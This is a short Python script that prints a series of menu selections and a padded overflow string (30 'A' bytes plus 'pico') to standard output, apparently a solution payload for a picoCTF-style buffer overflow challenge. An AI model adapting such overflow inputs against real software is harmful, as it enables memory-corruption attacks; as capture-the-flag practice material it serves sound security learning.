
from sys import stdout

def send(payload):
  stdout.buffer.write(payload)

send(b"5\n")
send(b"2\n")
send(b"35\n")
send(b"A"*30 + b"pico\n")
send(b"4\n")

